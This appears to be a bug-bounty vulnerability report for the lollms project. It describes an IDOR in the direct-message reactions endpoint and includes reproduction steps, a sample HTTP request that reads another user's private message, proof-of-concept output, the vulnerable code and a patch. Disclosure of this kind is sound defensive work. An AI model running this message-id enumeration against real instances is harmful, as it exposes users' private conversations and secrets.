# Title: Any authenticated user can read every private direct message (and tamper with reactions) via IDOR in `POST /api/dm/messages/{message_id}/reactions`

**Program / asset:** parisneo/lollms (huntr OSV) — `backend/routers/social/dm.py`, endpoint `POST /api/dm/messages/{message_id}/reactions` (`toggle_dm_reaction`)
**Affected version:** HEAD `a744154` (2026‑09‑14) and all prior versions that contain this endpoint. `APP_VERSION` in the tree reads `2.1.0` but the checkout is current `main` (it already contains the CVE‑2026‑10595 fix in `ui.py`).
**Weakness:** CWE‑639 Authorization Bypass Through User‑Controlled Key / CWE‑284 Broken Object‑Level Authorization (IDOR)
**Severity (self‑assessed):** High — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N` (7.1). Confidentiality of every user's private messages. (The sibling friend‑request IDOR, CVE‑2026‑0562, was scored 8.3.)

## Summary

`toggle_dm_reaction` looks up a direct message by its primary‑key integer id and performs **no check** that the caller is the sender, the receiver, or a member of the conversation. It then returns the full message object (`DirectMessagePublic`, which includes `content`). Any authenticated user can therefore read the plaintext of **any** private direct message on the server — 1:1 DMs and group messages they are not part of — by enumerating the sequential `message_id`, and can additionally write a reaction onto any message. Registration is open by default (`allow_new_registrations` defaults to `True`), so an attacker only needs to self‑register.

## Steps to reproduce

Roles: **alice** and **bob** (victims, exchange a private DM); **eve** (attacker, an ordinary account, not a party to that DM).

1. As **eve**, obtain a normal account (self‑register at `POST /api/auth/register` if not already registered) and log in to get a bearer token.
2. alice sends bob a private DM (e.g. via the UI or `POST /api/dm/send`). Note that its `message_id` is a small sequential integer; eve can simply iterate `1, 2, 3, …`.
3. As **eve**, call the reactions endpoint for that message id:
   ```
   POST /api/dm/messages/1/reactions
   Authorization: Bearer <eve_token>
   Content-Type: application/json

   {"emoji": "🔥"}
   ```
4. **Expected** (correct behavior): `403 Forbidden` — eve is not a party to message 1.
   **Actual:** `200 OK` with the full message in the body, including `content`, `sender_username`, `receiver_username`, `media`, `image_references`, and `reply_to_content`. eve's user id is also now persisted in that message's `reactions`.

Iterating `message_id` over the integer range dumps the content of every direct message on the instance.

## Proof of concept

`poc_dm_reaction_idor.py` (in this directory) runs the **real, unmodified** `toggle_dm_reaction` from the cloned HEAD source against a throwaway in‑memory SQLite database populated with the project's real ORM models. The only stubbed dependency is `lollms_client` (a heavy LLM library the DM path never touches); the websocket broadcast is a no‑op. It creates alice, bob, and a private DM between them, then calls the endpoint **as eve** and shows eve receives the secret content:

```
[i] Private DM #1: alice -> bob (attacker eve is NOT a party)
[i] eve calls POST /api/dm/messages/1/reactions ...

--- RESPONSE RETURNED TO ATTACKER eve ---
  message_id      : 1
  sender_username : alice
  receiver_username: bob
  content         : 'PRIVATE: my bank OTP is 738114 and my SSN is 555-01-2029'
  reactions       : {'🔥': [3]}          # 3 == eve's user id (write-IDOR)

=== VERDICT ===
  READ-IDOR  (eve read alice→bob private content): CONFIRMED
  WRITE-IDOR (eve wrote a reaction onto it)      : CONFIRMED
```

Run:
```
LOLLMS_SRC=/path/to/lollms-src PYTHONPATH=$LOLLMS_SRC \
  ./venv-lollms/bin/python poc_dm_reaction_idor.py
```

### The vulnerable code (`backend/routers/social/dm.py`)

```python
@dm_router.post("/messages/{message_id}/reactions", response_model=DirectMessagePublic)
async def toggle_dm_reaction(message_id: int, payload: MessageReactionRequest,
                             current_user: UserAuthDetails = Depends(get_current_active_user),
                             db: Session = Depends(get_db)):
    msg = db.query(DBDirectMessage).filter(DBDirectMessage.id == message_id).first()
    if not msg:
        raise HTTPException(status_code=404, detail="Message not found")
    # <-- NO check that current_user is sender/receiver/conversation member -->
    ...
    msg.reactions = current_reactions          # write to another user's message
    db.commit(); db.refresh(msg)
    resp = _map_direct_message_public(msg, db)  # returns content, sender, media, ...
    ...
    return resp
```

For contrast, the neighbouring `bulk_delete_messages` in the **same file** does apply the object filter (`or_(sender_id == current_user.id, receiver_id == current_user.id)`), and `get_dm_attachment` performs an explicit membership check — so the omission here is a genuine oversight, not a design choice.

## Impact

Complete disclosure of all users' private direct‑message content to any single low‑privileged account: personal conversations, shared secrets/OTPs, attachment filenames, and quoted replies. On an instance with open registration (the default) this is reachable by anyone who can sign up. Secondary integrity impact: an attacker can forge reactions on arbitrary messages. This is squarely in huntr's paid Broken‑Access‑Control / IDOR class (the sibling friend‑request IDOR was accepted as CVE‑2026‑0562, CVSS 8.3).

## Remediation

Enforce object‑level authorization before reading or mutating the message — mirror the check already used by `get_dm_attachment`/`bulk_delete_messages`:

```python
msg = db.query(DBDirectMessage).filter(DBDirectMessage.id == message_id).first()
if not msg:
    raise HTTPException(status_code=404, detail="Message not found")

is_party = current_user.id in (msg.sender_id, msg.receiver_id)
if not is_party and msg.conversation_id:
    is_party = db.query(DBConversationMember).filter_by(
        conversation_id=msg.conversation_id, user_id=current_user.id).first() is not None
if not is_party:
    raise HTTPException(status_code=404, detail="Message not found")  # 404 avoids id oracle
```

Apply the same participant check to every DM endpoint that resolves a message or conversation by id (a repo‑wide audit of `social/dm.py` is warranted, since this is the second IDOR in the social subsystem after CVE‑2026‑0562).

## Not a duplicate

Distinct from CVE‑2026‑0562 (friends `respond_request`, different endpoint/router) and CVE‑2026‑12228 (stored XSS that *writes* attacker HTML into `DBDirectMessage.content`; this report is a *read/authorization* flaw on the reactions endpoint). No published advisory covers `/api/dm/messages/{id}/reactions` or IDOR read of DM content. The human submitter must re‑confirm against the huntr disclosure list and GitHub advisories at submission time.
